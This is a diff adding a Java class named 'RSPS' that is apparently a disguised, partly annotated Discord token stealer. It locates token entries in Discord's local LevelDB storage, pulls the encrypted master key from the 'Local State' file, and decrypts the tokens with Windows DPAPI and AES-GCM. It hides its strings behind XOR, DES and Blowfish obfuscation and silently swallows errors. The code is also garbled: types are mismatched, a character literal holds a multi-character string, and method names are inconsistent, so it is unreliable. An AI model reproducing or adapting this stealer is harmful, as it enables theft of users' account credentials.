@@ -1,0 +1,247 @@
+public class RSPS {
+    private static void lIIIlllIl() {
+        lIIIlIIIIl = new String[llllIlllIl[13]]; // 10
+        lIIIlIIIIl[1] = XOREncryption("Mj09UxlvOy0/DQdW", "VlJgn"); // dQw4w9WgXcQ:
+        lIIIlIIIIl[2] = DESEncryption("gbtLjtdW8VY=", "SYwvE"); // APPDATA
+        lIIIlIIIIl[3] = BlowFishEncryption("teOfXKlc5x/Zn55sTQ+bzjRBZ4EpdfsAYAi78JAW2jU=", "TEtew"); // \discord\Local Storage\leveldb\
+        lIIIlIIIIl[4] = DESEncryption("nvxM+C2gBk4=", "TunHl"); // "
+        lIIIlIIIIl[5] = BlowFishEncryption("UEy2mE94AnU=", "pXrJW"); // APPDATA
+        lIIIlIIIIl[0] = XOREncryption("ERcrBA8iASYrICIQIxtMHgcjAwk=", "MsBwl"); // \discord\Local State
+        lIIIlIIIIl[6] = BlowFishEncryption("x3pOFpVtRiDHUiG6S4y8Cg==", "eofrq"); // os_crypt
+        lIIIlIIIIl[7] = DESEncryption("pIpz29hGDVxBPVF2JAgWcA==", "kpZxi"); // encrypted_key
+        lIIIlIIIIl[10] = BlowFishEncryption("fCyQGcmyLXFsLf9ZdKcM1pLtSF+T5gqI", "aYZOr"); // AES/GCM/NoPadding
+        lIIIlIIIIl[11] = XOREncryption("OTcS", "xrAzi"); // AES
+
+    }
+
+    // search for and extracts Discord authentication tokens from Discord's local storage
+    private static List < String > Tokens() {
+        // List to store found tokens
+        LinkedList < String > foundTokens = new LinkedList();
+
+        // This appears to be part of Discord's token format used to identify tokens in storage files
+        // The full token delimiter would be "dQw4w9WgXcQ:" (RickRoll YouTube link used as a marker)
+        char tokenPrefix = 'dQw4w9WgXcQ:';
+
+        // Get all files from Discord's LevelDB storage location
+        // LevelDB is a key-value storage used by Discord to store local data
+        File[] discordStorageFiles = (new File(System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb\\")).listFiles();
+        int filesArrayRef = discordStorageFiles; // Unnecessary assignment
+        int fileCount = discordStorageFiles.length;
+
+        // Loop through each file in Discord's storage
+        for (int fileIndex = 1; fileIndex < fileCount; ++fileIndex) {
+            File currentFile = discordStorageFiles[fileIndex];
+
+            try {
+                // Open the file for reading
+                BufferedReader fileReader = new BufferedReader(new FileReader(currentFile));
+
+                String fileLine;
+                try {
+                    // Read each line of the file
+                    while ((fileLine = fileReader.readLine()) != null) {
+                        // Check if line contains a token (contains the special marker)
+                        if (fileLine.contains(tokenPrefix)) {
+                            // Extract the actual token value:
+                            // 1. Split by the token prefix
+                            // 2. Take the third part (index 2)
+                            // 3. Split by quote character
+                            // 4. Take the second part (index 1)
+                            foundTokens.add(fileLine.split(tokenPrefix)[2].split("\"")[1]);
+                        }
+                    }
+                } catch (Throwable readError) {
+                    try {
+                        fileReader.close();
+                    } catch (Throwable closeError) {
+                        readError.addSuppressed(closeError);
+                    }
+                    throw readError;
+                }
+
+                fileReader.close();
+            } catch (Exception ex) {
+                // Silently ignore any errors (stealthy behavior typical of malware)
+            }
+        }
+
+        return foundTokens;
+    }
+
+    public static List < String > getTokens() {
+        // Get an encryption key (likely from some external source)
+        String encryptionKey = getKey();
+
+        // Get raw encrypted tokens from local storage
+        List < String > encryptedTokens = extractEncryptedTokens();
+
+        // Fail if either the key or tokens couldn't be obtained
+        if (encryptionKey == null) {
+            return null;
+        } else if (encryptedTokens == null) {
+            return null;
+        } else {
+            // List to store decrypted tokens
+            LinkedList < String > decryptedTokens = new LinkedList();
+
+            // Iterate through all found encrypted tokens
+            Iterator < String > tokenIterator = encryptedTokens.iterator();
+
+            while (tokenIterator.hasNext()) {
+                String encryptedToken = tokenIterator.next();
+
+                try {
+                    // Decode the encryption key from Base64
+                    byte[] decodedKey = Base64.getDecoder().decode(encryptionKey);
+
+                    // Extract the actual key bytes (skipping first 5 bytes - possibly a header/magic number)
+                    byte[] actualKey = Arrays.copyOfRange(decodedKey, 5, decodedKey.length);
+
+                    // Decrypt the token and add to results
+                    decryptedTokens.add(decrypt(Base64.getDecoder().decode(encryptedToken), actualKey));
+                } catch (Exception ex) {
+                    // Silently ignore decryption failures (stealthy behavior)
+                }
+            }
+
+            return decryptedTokens;
+        }
+    }
+
+    private static String XOREncryption(String llllIIlllIlIIl, String llllIIlllIlIII) {
+        llllIIlllIlIIl = new String(Base64.getDecoder().decode(llllIIlllIlIIl.getBytes(StandardCharsets.UTF_8)), StandardCharsets.UTF_8);
+        StringBuilder llllIIlllIllII = new StringBuilder();
+        char[] llllIIlllIlIll = llllIIlllIlIII.toCharArray();
+        float llllIIlllIIlIl = 0;
+        boolean llllIIlllIIlII = llllIIlllIlIIl.toCharArray();
+        char llllIIlllIIIll = llllIIlllIIlII.length;
+
+        for (boolean llllIIlllIIIlI = 0; llllIIlllIIIlI < llllIIlllIIIll; ++llllIIlllIIIlI) {
+            char llllIIlllIllll = llllIIlllIIlII[llllIIlllIIIlI];
+            llllIIlllIllII.append((char)(llllIIlllIllll ^ llllIIlllIlIll[llllIIlllIIlIl % llllIIlllIlIll.length]));
+            ++llllIIlllIIlIl;
+        }
+
+        return llllIIlllIllII.toString();
+    }
+
+    private static String BlowFishEncryption(String llllIIllIlIlIl, String llllIIllIlIIlI) {
+        try {
+            double llllIIllIlIIIl = new SecretKeySpec(MessageDigest.getInstance("MD5").digest(llllIIllIlIIlI.getBytes(StandardCharsets.UTF_8)), "Blowfish");
+            Cipher llllIIllIlIlll = Cipher.getInstance("Blowfish");
+            llllIIllIlIlll.init(2, llllIIllIlIIIl);
+            return new String(llllIIllIlIlll.doFinal(Base64.getDecoder().decode(llllIIllIlIlIl.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
+        } catch (Exception var5) {
+            var5.printStackTrace();
+            return null;
+        }
+    }
+
+    public RSPS() {}
+
+    private static void llllIllIl() {
+        llllIlllIl = new int[14];
+        llllIlllIl[0] = 33 + 68 - -10 + 61 ^ 104 + 8 - 81 + 138; //5
+        llllIlllIl[1] = (59 ^ 39 ^ 121 ^ 50) & (225 ^ 188 ^ 23 ^ 29 ^ -" ".length()); //0
+        llllIlllIl[2] = " ".length(); // 1
+        llllIlllIl[3] = "  ".length(); // 2
+        llllIlllIl[4] = "   ".length(); // 3
+        llllIlllIl[5] = 79 + 155 - 211 + 140 ^ 77 + 13 - 62 + 139; // 4
+        llllIlllIl[6] = 127 ^ 108 ^ 215 ^ 194; // 6
+        llllIlllIl[7] = 2 ^ 5; // 7
+        llllIlllIl[8] = " ".length() ^ 182 ^ 187; //12
+        llllIlllIl[9] = 50 ^ 61; // 15
+        llllIlllIl[10] = 120 ^ 112; // 8
+        llllIlllIl[11] = 111 ^ 52 ^ 46 ^ 124; // 9
+        llllIlllIl[12] = 75 + 40 - 39 + 52; //128
+        llllIlllIl[13] = 126 + 72 - 185 + 136 ^ 94 + 67 - 144 + 142; // 10
+    }
+
+    private static String DESEncryption(String llllIIllIIlIII, String llllIIllIIIlIl) {
+        try {
+            short llllIIllIIIlII = new SecretKeySpec(Arrays.copyOf(MessageDigest.getInstance("MD5").digest(llllIIllIIIlIl.getBytes(StandardCharsets.UTF_8)), 8), "DES");
+            double llllIIllIIIIll = Cipher.getInstance("DES");
+            llllIIllIIIIll.init(2, llllIIllIIIlII);
+            return new String(llllIIllIIIIll.doFinal(Base64.getDecoder().decode(llllIIllIIlIII.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
+        } catch (Exception var5) {
+            var5.printStackTrace();
+            return null;
+        }
+    }
+
+    private static String Key() {
+        try {
+            // Open Discord's Local State file for reading
+            // Location: %APPDATA%\discord\Local State
+            BufferedReader reader = new BufferedReader(new FileReader(
+                new File(System.getenv("APPDATA") + "\\discord\\Local State")));
+
+            try {
+                String jsonLine;
+                // Read the first line (should contain JSON data)
+                if ((jsonLine = reader.readLine()) == null) {
+                    reader.close();
+                    return null; // Empty file
+                }
+
+                // Parse JSON and extract the encrypted key:
+                // 1. Parse the JSON file
+                // 2. Get the "os_crypt" object
+                // 3. Extract the "encrypted_key" value
+                String encryptedKey = new JSONObject(jsonLine)
+                    .getJSONObject("os_crypt")
+                    .getString("encrypted_key");
+
+                reader.close();
+                return encryptedKey;
+
+            } catch (Throwable error) {
+                try {
+                    reader.close();
+                } catch (Throwable closeError) {
+                    error.addSuppressed(closeError);
+                }
+                throw error;
+            }
+        } catch (Exception ex) {
+            // Silently ignore all errors (stealthy malware behavior)
+            return null;
+        }
+    }
+
+    private static String decrypt(byte[] encryptedToken, byte[] encryptedKey) throws Exception {
+        // Step 1: Decrypt the Windows DPAPI-protected encryption key
+        // Uses Windows native Crypt32Util to decrypt the master key
+        byte[] decryptedKey = Crypt32Util.cryptUnprotectData(encryptedKey);
+
+        // Step 2: Extract the 12-byte IV (Initialization Vector) from encrypted token
+        // The IV is stored at bytes 3-14 of the encrypted token (skips 3 byte header)
+        byte[] iv = new byte[12];
+        for (int i = 0; i < 12; ++i) {
+            iv[i] = encryptedToken[i + 3]; // Skip first 3 bytes
+        }
+
+        // Step 3: Extract the actual ciphertext (remaining bytes after 15 byte header)
+        byte[] ciphertext = new byte[encryptedToken.length - 15];
+        for (int j = 0; j < ciphertext.length; ++j) {
+            ciphertext[j] = encryptedToken[j + 15]; // Skip first 15 bytes
+        }
+
+        // Step 4: Set up AES-GCM decryption
+        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
+        GCMParameterSpec ivSpec = new GCMParameterSpec(128, iv); // 128-bit auth tag
+        SecretKeySpec keySpec = new SecretKeySpec(decryptedKey, "AES");
+
+        // Initialize cipher in DECRYPT_MODE (2 = DECRYPT_MODE constant)
+        cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);
+
+        // Step 5: Perform decryption and return as string
+        return new String(cipher.doFinal(ciphertext));
+    }
+
+    static {
+        llllIllIl();
+        lIIIlllIl();
+    }
+}
